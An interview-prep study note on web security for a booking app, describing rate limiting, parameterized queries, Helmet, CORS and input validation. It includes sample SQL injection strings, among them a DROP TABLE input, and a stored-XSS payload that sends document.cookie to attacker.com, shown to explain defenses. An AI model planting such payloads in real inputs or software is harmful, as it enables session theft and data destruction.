# Topic 06: Web Application Security
> 10+ security layers in Pojjari — OWASP Top 10 coverage in a production app

---

## 6.1 Security Overview — Pojjari's 10 Layers

```
Layer 1:  Rate Limiting           — express-rate-limit (per IP)
Layer 2:  Account Lockout         — Redis-based login attempt tracking
Layer 3:  HTTPS                   — SSL/TLS via Nginx + Let's Encrypt
Layer 4:  Helmet.js               — 7+ security HTTP headers
Layer 5:  CORS                    — Whitelist only trusted origins
Layer 6:  SQL Injection           — Parameterized queries (mysql2)
Layer 7:  XSS Prevention          — Input sanitization + CSP headers
Layer 8:  bcrypt                  — Password hashing (never plain text)
Layer 9:  JWT                     — Stateless auth, signed tokens
Layer 10: Input Validation        — express-validator on all routes
```

---

## 6.2 SQL Injection

One of the most critical vulnerabilities. Attacker injects SQL code through user input.

```js
// VULNERABLE — NEVER do this
const email = req.body.email;  // Attacker sends: ' OR '1'='1
const query = `SELECT * FROM users WHERE email = '${email}'`;
// Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1' -- '
// Returns ALL users → attacker bypasses login!

// DROP TABLE attack
// email = '; DROP TABLE users; --
// SELECT * FROM users WHERE email = ''; DROP TABLE users; --

// SAFE — Parameterized queries (Pojjari uses this EVERYWHERE)
const [rows] = await pool.query(
  'SELECT * FROM users WHERE email = ?',
  [req.body.email]  // mysql2 library escapes this — treated as literal string
);
```

**mysql2 library automatically escapes all `?` parameters.** Every single SQL query in Pojjari uses parameterized form.

---

## 6.3 XSS — Cross-Site Scripting

Attacker injects malicious JavaScript that runs in victims' browsers.

### Types of XSS

**Stored XSS** (most dangerous): Malicious script stored in DB, served to every visitor.
```
Attacker posts blog comment: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
Server saves it in DB
Every user who loads that page → script runs → cookies stolen
```

**Reflected XSS**: Script in URL parameter, reflected in response.
```
https://pojjari.com/search?q=<script>alert(1)</script>
```

### Prevention in Pojjari

```js
// 1. Helmet.js — sets Content-Security-Policy header
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],   // no inline scripts allowed
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
}));
// Browser refuses to load scripts from unknown origins

// 2. Input sanitization before storing in DB
const { body, validationResult } = require('express-validator');

const sanitizeInput = [
  body('comment').trim().escape(),   // removes HTML tags, escapes special chars
  body('name').trim().escape(),
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });
    next();
  }
];

// 3. React frontend auto-escapes — {user.comment} in JSX is safe
// React DOES NOT interpret HTML in text nodes
// Only dangerous: dangerouslySetInnerHTML — never use with user content
```

---

## 6.4 Rate Limiting + Account Lockout

### Global Rate Limiting
```js
const rateLimit = require('express-rate-limit');

// All API routes — prevent DDoS
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // max 100 requests per IP per window
  standardHeaders: true,
  message: { message: 'Too many requests, please try again later.' },
});
app.use('/api', globalLimiter);

// Login route — stricter
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,   // max 5 login attempts per 15 minutes
  skipSuccessfulRequests: true,  // don't count successful logins
});
router.post('/login', loginLimiter, ctrl.login);
```

### Redis-Based Account Lockout (More Fine-grained)
```js
// middleware/accountLockout.js
async function checkAccountLockout(req, res, next) {
  const { email } = req.body;
  if (!email) return next();

  const key = `lockout:${email}`;
  const attempts = await redis.get(key);

  if (parseInt(attempts) >= 5) {
    const ttl = await redis.ttl(key);
    return res.status(429).json({
      message: `Account locked. Try again in ${Math.ceil(ttl / 60)} minutes.`
    });
  }
  next();
}

async function recordFailedAttempt(email) {
  const key = `lockout:${email}`;
  await redis.incr(key);
  await redis.expire(key, 900); // lock for 15 minutes
}

async function resetAttempts(email) {
  await redis.del(`lockout:${email}`); // clear on successful login
}
```

---

## 6.5 Helmet.js — Security Headers

```js
app.use(helmet());

// Helmet sets these headers automatically:
X-Content-Type-Options: nosniff          // prevent MIME type sniffing
X-Frame-Options: SAMEORIGIN             // prevent clickjacking (no iframe embed)
X-XSS-Protection: 1; mode=block        // XSS filter (legacy browsers)
Strict-Transport-Security: max-age=...  // force HTTPS
Content-Security-Policy: ...            // control what resources can load
Referrer-Policy: no-referrer            // don't leak URL in Referer header
Permissions-Policy: ...                 // restrict browser features
```

```js
// headers you can see in browser DevTools → Network → Response Headers
// These make attackers' lives much harder
```

---

## 6.6 CORS — Cross-Origin Resource Sharing

```js
// CORS is a browser security mechanism — blocks requests from different origins
// Origin = protocol + domain + port

// app.js
const cors = require('cors');
app.use(cors({
  origin: (origin, callback) => {
    const whitelist = [
      'https://pujari.mydashboard.site',
      'http://localhost:5173',    // Vite dev server
      'http://localhost:3000',    // CRA dev server
    ];
    if (!origin || whitelist.includes(origin)) {
      callback(null, true);   // allow
    } else {
      callback(new Error('Not allowed by CORS'));  // reject
    }
  },
  credentials: true,          // allow Authorization header + cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

**Important:** CORS is enforced by **browsers**, not servers. Postman / curl doesn't check CORS. It protects users from malicious websites making requests to your API on their behalf.

---

## 6.7 Input Validation

```js
const { body, param, validationResult } = require('express-validator');

// Validation rules for booking creation
const validateBooking = [
  body('pujariId').isInt({ min: 1 }).withMessage('Valid pujari ID required'),
  body('date').isDate().withMessage('Valid date required'),
  body('time').matches(/^([01]\d|2[0-3]):([0-5]\d)$/).withMessage('Valid time HH:MM required'),
  body('poojaType').trim().notEmpty().withMessage('Pooja type required'),
  body('mobile').isMobilePhone('en-IN').withMessage('Valid Indian mobile number required'),

  // Error handler
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    next();
  }
];

router.post('/', auth, validateBooking, ctrl.createBooking);
```

---

## 6.8 Security Best Practices Checklist

```
✅ Parameterized queries (SQL injection)
✅ bcrypt for passwords (never MD5/SHA1)
✅ JWT signed with strong secret (32+ random chars)
✅ HTTPS everywhere (Let's Encrypt)
✅ Helmet.js security headers
✅ Rate limiting on all endpoints
✅ Account lockout on repeated login failures
✅ Input validation and sanitization
✅ CORS whitelist
✅ No sensitive data in JWT payload
✅ No stack traces in production error responses
✅ .env file never committed to git
✅ Environment-specific secrets (dev vs prod)
✅ JWT expiry set (7 days max)
✅ Password reset tokens single-use + expiry
```

---

## 6.9 Common Vulnerabilities — OWASP Top 10 (Key ones)

| # | Vulnerability | What it is | Pojjari Prevention |
|---|---------------|-----------|-------------------|
| A01 | Broken Access Control | Accessing unauthorized resources | Auth + RBAC middleware |
| A02 | Cryptographic Failures | Weak/no encryption | bcrypt, HTTPS, JWT |
| A03 | Injection | SQL/XSS injection | Parameterized queries, input sanitization |
| A04 | Insecure Design | No rate limiting, no lockout | Rate limit + account lockout |
| A05 | Security Misconfiguration | Default passwords, verbose errors | Helmet, custom error handler |
| A07 | Auth Failures | Brute force, weak passwords | Account lockout, bcrypt |

---

## Interview Q&A

**Q: XSS म्हणजे काय? Pojjari मध्ये कसं prevent केलं?**
> XSS = attacker user input मध्ये `<script>` inject करतो. Stored XSS: DB मध्ये save होतं, प्रत्येक user ला serve होतं. Reflected: URL parameter मध्ये.
> Prevention: 1) Helmet.js CSP header — browser external scripts block करतो. 2) Input sanitization — express-validator `.escape()`. 3) React automatically escapes JSX text — `{user.comment}` safe आहे. `dangerouslySetInnerHTML` avoid करतो.

**Q: Rate Limiting कसं implement केलं?**
> `express-rate-limit` middleware — IP per time window request count track करतो. Global: 100 req/15min. Login: 5 attempts/15min, `skipSuccessfulRequests: true`. Login endpoint वर extra Redis-based account lockout — email-specific, 5 failures = 15-min lock.

**Q: Helmet.js काय करतो?**
> 7+ HTTP security headers set करतो: CSP (script sources control), X-Frame-Options (clickjacking prevent), HSTS (HTTPS enforce), X-Content-Type-Options (MIME sniff prevent). Default `app.use(helmet())` alone big security improvement आहे.

**Q: CORS म्हणजे काय? Backend CORS configure का करायचं?**
> CORS = browser policy — different origin (domain/port) वरून fetch/XHR block करतो. Pojjari backend `cors()` middleware configure केलं — फक्त whitelisted origins allow. `credentials: true` Authorization header allow करतो.
> Important: CORS browser-enforced आहे. Postman ला CORS नसतं — म्हणजे API server-to-server calls block होत नाहीत. फक्त browser-based attacks prevent होतात.

**Q: SQL Injection demonstrate करा + fix**
> Attacker `'; DROP TABLE users; --` input देतो. Vulnerable: string concatenation → query मध्ये inject होतं. Fix: `pool.query('SELECT * FROM users WHERE email = ?', [email])` — `?` placeholder, mysql2 value escape करतो, SQL ला literal string म्हणून treat होतो.

**Q: bcrypt का, MD5 का नाही?**
> MD5 is fast — GPU वर billions of hashes/second. Dictionary attacks trivial. bcrypt deliberately slow (cost factor 10 = 1024 iterations), GPU-resistant, built-in salt (same password → different hash), designed for passwords specifically.

---

## Pojjari Project Connection

| Security Feature | Implementation |
|----------------|---------------|
| Login protection | `express-rate-limit` (5/15min) + Redis lockout |
| All SQL | Parameterized `?` queries via mysql2 |
| Passwords | bcrypt, saltRounds = 10 |
| Tokens | JWT signed with 256-bit secret |
| Headers | `helmet()` — 7 security headers |
| CORS | Whitelist: production + localhost |
| Input validation | express-validator on booking, auth routes |
| Reset tokens | Single-use, 1-hour expiry, crypto.randomBytes(32) |
| Error responses | No stack traces in production |

---

## Summary Table

| Concept | Defense Against | How |
|---------|----------------|-----|
| Parameterized queries | SQL Injection | mysql2 `?` params |
| bcrypt | Password cracking | Slow hash + salt |
| Rate limiting | Brute force / DDoS | express-rate-limit |
| Account lockout | Credential stuffing | Redis INCR per email |
| Helmet | Multiple header attacks | Sets 7+ HTTP headers |
| CORS whitelist | Cross-origin attacks | cors() with origin list |
| Input validation | Malformed input | express-validator |
| JWT expiry | Stolen token risk | 7d expiry, short tokens |
| HTTPS | MITM attacks | Nginx + Let's Encrypt |
| CSP | XSS | Helmet content-security-policy |
